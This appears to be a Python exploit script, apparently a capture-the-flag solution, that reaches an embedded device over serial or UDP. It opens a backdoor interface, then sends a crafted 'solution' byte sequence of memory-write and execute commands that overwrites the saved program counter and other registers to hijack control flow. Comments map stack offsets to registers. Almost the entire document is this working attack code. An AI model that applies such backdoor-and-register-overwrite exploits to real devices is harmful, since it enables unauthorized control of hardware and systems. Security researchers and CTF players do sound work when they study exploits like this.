from comms import UDP_Comms, Serial_Comms
import socket, time
from binascii import unhexlify, hexlify

response1 = "DEADBEEF" + "08A4C046003D000F474233EB020001020202020101000000000000000000" +\
    "0000000000000000000000000000FFFF85A1FFFF85A1" + \
    "40000000" + "00000002" + "00001D98" + \
    "00000017"

response2 = "DEADBEEF" + "08A4C046003D000F474233EB020001020202020101000000000000000000" +\
    "0000000000000000000000000000FFFF85A1FFFF85A1" + \
    "40000002" + "00000002" + "FFFF9CB9" + \
    "00000017"

START = 0  
END = 1 
WRITE = 2 
EXEC = 3
solution = [ 
    EXEC, 0,
    #4 + WRITE, 0xBC, 0x42, 0x80, 0x01, 0xe0 - 8,
    4 + WRITE, 0xBC, 0x40, 0x06, 0x06, 0xC0 - 8, #x06\xbc
    4 + WRITE, 0xA0, 0x42, 0x80, 0x00, 0x38, 
]


# BC : PC
# B8 : FP
# B4 : I5
# B0 : I4
# AC : I3
# A8 : I2
# A4 : I1
# A0 : I0

if __name__ == "__main__":
    #comms = UDP_Comms('127.0.0.1', 1234, 1235)
    comms = Serial_Comms("/dev/ttyUSB2")
    comms.enable_tlm()
    #time.sleep(1)
    #dump = b''
    
    #dump += comms.backdoor_dump(b"UPLINK_Read", 0, 32)
    #dump += comms.backdoor_dump(b"UPLINK_Read", 32, 32)
    #dump += comms.backdoor_dump(b"UPLINK_Read", 64, 32)
    ##print(hexlify(dump))
    comms.backdoor_unlock()

    time.sleep(1)
    comms.backdoor_shell(bytes(solution))
    comms.test_unlock()
    
    #time.sleep(1)
    #comms.backdoor_lock()
    #comms.test_unlock()